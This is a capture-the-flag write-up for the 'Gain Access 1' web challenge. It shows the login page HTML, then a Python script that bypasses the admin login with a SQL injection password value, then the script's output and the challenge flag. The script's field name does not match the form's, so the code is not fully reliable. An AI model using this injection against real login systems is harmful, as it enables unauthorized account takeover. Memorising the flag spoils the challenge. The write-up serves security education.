# Gain Access 1

## Description
```
 The web challenges are very much similar to real life application bugs. 
 This is going to be a series of Gain Access with 3 challenges unlocks upon solving one by one. 
 By solving these challenges, you'll gain a practical knowledge of Authentication Bypass Vulnerabilites as well as business logic error. 
 The only difference is you'll not get any bounty but you'll get flags. Give it a try. 
 And keep in mind, Don't make it hard, keep it simple. 
 All the best. Solve the challenges & be a cyber knight. 
```

## Writeup

Visiting the website I saw a login page. <br/>
```html
<!doctype html>
<html lang="en">
<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="stylesheet" href="style.css">
  <title>Admin Login</title>
</head>
<body>
  <div class="container card-container">
    <div class="row justify-content-center">
      <div class="col-6 card">
        <h2>Login</h2>
        <form action="" method="POST">
          <div class="form-group">
            <label for="email">Email address</label>
            <input type="email" class="form-control" id="email" name="admin_email" required>
          </div>
          <div class="form-group">
            <label for="password">Password</label>
            <input type="password" class="form-control" id="password" name="admin_pass" required>
          </div>
          <div>
            <a href="forgot.php" style="color: white; padding: 2px;">Forgot Password?</a>
          </div><br>
          <input type="submit" class="btn btn-primary" name="submit_btn" value="Submit">
        </form>
      </div>
    </div>
  </div>
</body>
</html>

---------------------------------------

<!-- root@knightctf.com -->
```

Finding the email in the html I thought that we once again need to bypass the password parameter. <br/>
For this purpose I wrote a small script again. <br/>
```py
import requests

session = requests.Session()

base_URL = 'http://45.33.123.243:13556/'

req = session.get(f'{base_URL}')

login_data = {
    'admin_email': 'root@knightctf.com',
    'admin_password': "' or 1=1; -- ",
    'submit_btn': "Submit"
}

req = session.post(f'{base_URL}index.php', data=login_data)

print(req.text)
```

Executing the script I obtained the flag which concludes this writeup. <br/>
```sh
kali@kali python3 solve.py
---------------------------------
Here is your flag: KCTF{ACc0uNT_tAk3Over}
---------------------------------
```

